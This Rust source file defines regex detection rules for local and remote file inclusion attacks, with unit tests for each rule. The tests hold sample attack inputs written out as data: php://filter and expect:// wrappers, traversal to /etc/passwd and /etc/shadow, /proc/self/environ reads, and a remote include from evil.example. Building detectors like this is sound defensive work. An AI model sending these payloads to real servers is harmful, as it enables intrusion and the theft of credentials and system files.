//! Local/remote file inclusion: PHP stream wrappers, include-style parameters
//! pointing at traversal or system paths, and known sensitive files.

use super::rule::RuleSpec;
use crate::model::threat::Category;

pub const SPECS: &[RuleSpec] = &[
    RuleSpec::target(
        "LFI-001",
        "PHP stream wrapper",
        "php_wrapper",
        Category::LocalFileInclusion,
        9,
        r"php://(?:filter|input|data|expect|zip|phar|temp|memory|fd)",
    ),
    RuleSpec::target(
        "LFI-002",
        "Include-style parameter with a sensitive path",
        "file_param_traversal",
        Category::LocalFileInclusion,
        9,
        r"[?&](?:file|filename|filepath|include|inc|require|page|template|tpl|view|load|doc|document|path|dir|folder|root|pg|lang|locale)=[^&\s]*(?:\.\./|\.\.\\|/etc/|/proc/|php://|file://|/var/log|win\.ini|boot\.ini)",
    ),
    RuleSpec::target(
        "LFI-003",
        "Direct access to /etc",
        "etc_passwd",
        Category::LocalFileInclusion,
        9,
        r"(?:^|/)etc/(?:passwd|shadow|group|hosts|sudoers|crontab|issue|motd|resolv\.conf)\b",
    ),
    RuleSpec::target(
        "LFI-004",
        "Access to /proc/self",
        "proc_self",
        Category::LocalFileInclusion,
        9,
        r"/proc/(?:self|\d{1,7})/(?:environ|cmdline|fd/|status|maps|mem|root|cwd|exe)",
    ),
    RuleSpec::target(
        "LFI-005",
        "Windows system file access",
        "windows_ini",
        Category::LocalFileInclusion,
        9,
        r"(?:/windows/win\.ini|/winnt/win\.ini|/boot\.ini|/windows/system32/|/windows/repair/)",
    ),
    RuleSpec::target(
        "LFI-006",
        "data:// wrapper",
        "data_wrapper",
        Category::LocalFileInclusion,
        9,
        r"data://(?:text/plain|application/|php)",
    ),
    RuleSpec::target(
        "LFI-007",
        "expect:// wrapper",
        "expect_wrapper",
        Category::LocalFileInclusion,
        9,
        r"expect://",
    ),
    RuleSpec::target(
        "LFI-008",
        "Archive stream wrapper",
        "archive_wrapper",
        Category::LocalFileInclusion,
        9,
        r"(?:zip|phar|compress\.zlib|compress\.bzip2|ogg|zlib)://",
    ),
    RuleSpec::target(
        "LFI-009",
        "Parameter pointing at logs or web roots",
        "log_poisoning_path",
        Category::LocalFileInclusion,
        8,
        r"[?&](?:file|page|path|template|view|load|doc)=[^&\s]*(?:/var/log/|/var/www/|/tmp/|access\.log|error\.log|/proc/self/)",
    ),
    RuleSpec::raw(
        "LFI-010",
        "Percent-encoded stream wrapper",
        "encoded_wrapper",
        Category::LocalFileInclusion,
        9,
        r"(?:php|file|data|expect|zip|phar)%3a%2f%2f",
    ),
    RuleSpec::target(
        "LFI-011",
        "Remote file inclusion",
        "remote_include",
        Category::LocalFileInclusion,
        9,
        r"[?&](?:include|inc|require|page|template|file|load)=(?:https?|ftp)://",
    ),
];

#[cfg(test)]
mod tests {
    use super::super::test_util::{assert_clean, assert_hit, entry};

    #[test]
    fn detects_php_wrappers() {
        assert_hit(
            &entry("/?file=php://filter/convert.base64-encode/resource=index.php"),
            "LFI-001",
        );
        assert_hit(&entry("/?file=php://input"), "LFI-001");
        assert_hit(&entry("/?file=data://text/plain;base64,SGVsbG8="), "LFI-006");
        assert_hit(&entry("/?file=expect://id"), "LFI-007");
        assert_hit(&entry("/?file=phar://uploads/x.phar"), "LFI-008");
        assert_hit(&entry("/?file=php%3a%2f%2ffilter"), "LFI-010");
    }

    #[test]
    fn detects_include_parameters() {
        assert_hit(&entry("/?page=../../etc/passwd"), "LFI-002");
        assert_hit(&entry("/?template=../../../../etc/shadow"), "LFI-002");
        assert_hit(&entry("/?include=http://evil.example/x.txt"), "LFI-011");
        assert_hit(&entry("/?file=/var/log/nginx/access.log"), "LFI-009");
    }

    #[test]
    fn detects_system_file_access() {
        assert_hit(&entry("/index.php?page=/etc/passwd"), "LFI-003");
        assert_hit(&entry("/?path=/proc/self/environ"), "LFI-004");
        assert_hit(&entry("/?path=/windows/win.ini"), "LFI-005");
        assert_hit(&entry("/?path=/proc/self/cmdline"), "LFI-004");
    }

    #[test]
    fn ignores_benign_paths() {
        assert_clean(&entry("/docs/php-getting-started"));
        assert_clean(&entry("/files/report-2024.pdf"));
        assert_clean(&entry("/index.php?page=2"));
        assert_clean(&entry("/download?file=manual.pdf"));
    }
}
